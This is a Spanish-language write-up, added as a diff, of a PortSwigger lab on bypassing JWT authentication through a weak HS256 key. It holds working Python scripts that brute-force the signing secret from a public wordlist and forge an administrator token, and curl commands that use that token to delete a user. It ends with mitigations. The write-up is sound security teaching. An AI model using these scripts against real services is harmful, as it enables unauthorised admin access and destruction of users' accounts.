@@ -1,0 +1,221 @@
+---
+title: "Bypass de Autenticación JWT mediante Clave de Firma Débil"
+description: "Cómo explotar claves de firma JWT débiles mediante fuerza bruta del secreto para forjar tokens de administrador y evadir la autenticación."
+labUrl: "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key"
+category: "JWT"
+date: "2025-02-27"
+portswiggerDescription: "Este lab utiliza un mecanismo basado en JWT para gestionar sesiones. La clave de firma JWT es débil y puede ser descubierta por fuerza bruta usando un diccionario de secretos comunes. Para resolver el lab, necesitas descubrir por fuerza bruta la clave secreta usada para firmar el JWT, luego usarla para forjar un JWT válido que te dé acceso al panel de administración y eliminar al usuario `carlos`."
+lang: "es"
+---
+
+import CollapsiblePartial from '../../../components/CollapsiblePartial.astro';
+import PartialContainer from '../../../components/PartialContainer.astro';
+
+## Conceptos Previos Necesarios Para Resolver El Lab
+
+<PartialContainer>
+  <CollapsiblePartial partial="whats-jwt" title="Fundamentos de JWT" lang="es" />
+  <CollapsiblePartial partial="hs256-bruteforce" title="HS256 y Ataques de Fuerza Bruta" lang="es" />
+</PartialContainer>
+
+## Resolución
+
+Exploremos la página de login del lab directamente e iniciemos sesión para obtener un token JWT de sesión válido:
+
+```bash
+curl "https://<lab-url>.web-security-academy.net/login"
+```
+
+La página de login tiene un formulario simple con un token CSRF:
+
+```html
+<form class=login-form method=POST action="/login">
+    <input required type="hidden" name="csrf" value="fthIkYLXgsmolAFaGeb1sSSEMeShaZtX">
+    <label>Username</label>
+    <input required type=username name="username" autofocus>
+    <label>Password</label>
+    <input required type=password name="password">
+    <button class=button type=submit> Log in </button>
+</form>
+```
+
+Iniciemos sesión con las credenciales proporcionadas:
+
+```bash
+curl -D - "https://<lab-url>.web-security-academy.net/login" -d "csrf=KmODI4GCLxAFAM1LoQhLZpDVOO1kPySm&username=wiener&password=peter"
+```
+
+> **Desglose del comando**: \
+`-D -` = mostrar cabeceras de respuesta en stdout \
+`-d "csrf=...&username=wiener&password=peter"` = enviar datos POST (automáticamente establece el método a POST y Content-Type a application/x-www-form-urlencoded)
+
+Respuesta:
+
+```
+HTTP/2 302 
+location: /my-account?id=wiener
+set-cookie: session=eyJraWQiOiIxNzBjMzUxZS01OGNjLTRlNGItOTExNi02ZTc5MjQzMzc1ODAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjE5ODk1Nywic3ViIjoid2llbmVyIn0.YBG0i0B9Qamr6Gw50igBg_ZdwEbbzUPzHKIpG_ecBOk; Secure; HttpOnly; SameSite=None
+```
+
+La cookie de sesión es un token JWT. Decodifiquémoslo para entender su estructura:
+
+```bash
+echo "eyJraWQiOiIxNzBjMzUxZS01OGNjLTRlNGItOTExNi02ZTc5MjQzMzc1ODAiLCJhbGciOiJIUzI1NiJ9" | base64 -d | jq .
+```
+
+> **Desglose del comando**: \
+`echo "..."` = imprimir la parte del header del JWT \
+`base64 -d` = decodificar base64 \
+`jq .` = formatear JSON
+
+Salida del header:
+
+```json
+{
+  "kid": "170c351e-58cc-4e4b-9116-6e7924337580",
+  "alg": "HS256"
+}
+```
+
+Ahora decodifiquemos el payload:
+
+```bash
+echo "eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjE5ODk1Nywic3ViIjoid2llbmVyIn0" | base64 -d | jq .
+```
+
+Salida del payload:
+
+```json
+{
+  "iss": "portswigger",
+  "exp": 1772198957,
+  "sub": "wiener"
+}
+```
+
+El JWT usa **HS256** (HMAC-SHA256) para la firma, lo que significa que utiliza una clave secreta simétrica. Si el secreto es débil, podemos descubrirlo por fuerza bruta. Creemos un script de Python para crackear la clave de firma JWT usando el diccionario sugerido en la descripción del lab:
+
+```python
+import hmac
+import hashlib
+import base64
+import urllib.request
+
+JWT = "eyJraWQiOiIxNzBjMzUxZS01OGNjLTRlNGItOTExNi02ZTc5MjQzMzc1ODAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjE5ODk1Nywic3ViIjoid2llbmVyIn0.YBG0i0B9Qamr6Gw50igBg_ZdwEbbzUPzHKIpG_ecBOk"
+
+WORDLIST_URL = "https://raw.githubusercontent.com/wallarm/jwt-secrets/refs/heads/master/jwt.secrets.list"
+
+header, payload, target_signature = JWT.split('.')
+
+wordlist = urllib.request.urlopen(WORDLIST_URL)
+
+def create_jwt_signature_from_secret(secret):
+    message = f"{header}.{payload}"
+    hmac_digest = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
+    jwt_signature = base64.urlsafe_b64encode(hmac_digest).decode().rstrip('=')
+    return jwt_signature
+
+for secret in wordlist.read().decode().splitlines():
+    if target_signature == create_jwt_signature_from_secret(secret):
+        print(f"Found secret: {secret}")
+        break
+else:
+    print("Secret not found")
+```
+
+> **Desglose del script**: \
+> El script realiza un ataque de fuerza bruta a la firma JWT:
+> 1. **Descarga** el diccionario jwt-secrets que contiene secretos de firma JWT comunes
+> 2. **Itera** a través de cada clave secreta potencial del diccionario
+> 3. **Calcula** HMAC-SHA256 del **mensaje** (`header + '.' + payload`) con cada secreto
+> 4. **Codifica en Base64URL** el digest HMAC para generar una firma de prueba
+> 5. **Compara** la firma generada con la firma original del JWT
+> 6. **Una coincidencia** indica que se ha encontrado el **secreto** (clave de firma) correcto del JWT
+
+Salida esperada:
+
+```
+Found secret: secret1
+```
+
+Ahora podemos forjar un JWT con `sub: "administrator"` para obtener acceso de administrador.
+
+Creemos un script para forjar el token:
+
+```python
+import hmac
+import hashlib
+import base64
+
+JWT_SECRET = "secret1"
+
+def b64(data): return base64.urlsafe_b64encode(data).decode().rstrip('=')
+
+header = '{"kid":"170c351e-58cc-4e4b-9116-6e7924337580","alg":"HS256"}'
+
+tampered_jwt_payload = '{"iss":"portswigger","exp":1772198957,"sub":"administrator"}'
+
+message = f"{b64(header.encode())}.{b64(tampered_jwt_payload.encode())}"
+
+forged_signature = b64(hmac.new(JWT_SECRET.encode(), message.encode(), hashlib.sha256).digest())
+
+admin_jwt = f"{message}.{forged_signature}"
+
+print(admin_jwt)
+```
+
+> **Desglose del script**: \
+> El script crea un nuevo JWT con:
+> 1. El mismo header (algoritmo HS256)
+> 2. Payload modificado con `"sub": "administrator"`
+> 3. Firma válida calculada usando el secreto crackeado `secret1`
+
+Salida de ejemplo:
+
+```
+eyJraWQiOiIxNzBjMzUxZS01OGNjLTRlNGItOTExNi02ZTc5MjQzMzc1ODAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjE5ODk1Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9._c625IJtnNvYYk8TptqMszoBMxuItUXT4yWqgRXNhXs
+```
+
+Ahora accedamos al panel de administración con nuestro JWT forjado:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/admin" \
+  -b "session=eyJraWQiOiIxNzBjMzUxZS01OGNjLTRlNGItOTExNi02ZTc5MjQzMzc1ODAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjE5ODk1Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9._c625IJtnNvYYk8TptqMszoBMxuItUXT4yWqgRXNhXs" \
+  | grep -A 5 "carlos"
+```
+
+> **Desglose del comando**: \
+`-b "session=..."` = enviar el JWT forjado como cookie de sesión \
+`grep -A 5 "carlos"` = mostrar líneas que contienen "carlos" y 5 líneas después (los labs de PortSwigger siempre incluyen un usuario "carlos" para eliminar en el panel de admin, así que esta es una forma rápida de verificar el acceso de administrador)
+
+Respuesta:
+
+```html
+<span>carlos - </span>
+<a href="/admin/delete?username=carlos">Delete</a>
+```
+
+Ahora que tenemos acceso de administrador, eliminemos al usuario carlos:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/admin/delete?username=carlos" \
+  -b "session=eyJraWQiOiIxNzBjMzUxZS01OGNjLTRlNGItOTExNi02ZTc5MjQzMzc1ODAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjE5ODk1Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9._c625IJtnNvYYk8TptqMszoBMxuItUXT4yWqgRXNhXs"
+```
+
+El bypass de autenticación JWT nos permitió **enviar a carlos al vacío digital**, completando el lab.
+
+## Estrategias de Mitigación
+
+1. **Usar secretos fuertes**: Las claves de firma JWT deben ser largas, aleatorias y criptográficamente seguras (al menos 256 bits para HS256). Nunca uses palabras de diccionario o frases comunes
+2. **Implementar algoritmos asimétricos si es posible**: Considera usar RS256 (RSA) o ES256 (ECDSA) en lugar de HS256. Estos usan pares de claves pública/privada, haciendo los ataques de fuerza bruta imposibles
+3. **Rotar claves regularmente**: Implementa políticas de rotación de claves para limitar el impacto de una clave comprometida
+4. **Almacenar secretos de forma segura**: Usa variables de entorno o sistemas de gestión de secretos en lugar de codificar secretos directamente
+5. **Validar todos los claims del JWT**: Siempre verifica el emisor (`iss`), expiración (`exp`) y otros claims del lado del servidor
+
+## Referencias
+
+**Claims\*** son declaraciones sobre una entidad (típicamente el usuario) y datos adicionales, como identidad (`sub`), emisor (`iss`), tiempo de expiración (`exp`) y otros metadatos. [Más información sobre JWT claims](https://datatracker.ietf.org/doc/html/rfc7519#section-4)
+
+## Recursos
+
+[JWT.io Debugger](https://jwt.io/) Esta es una herramienta interactiva para decodificar, verificar y depurar tokens JWT. También me fue útil cuando era desarrollador web.
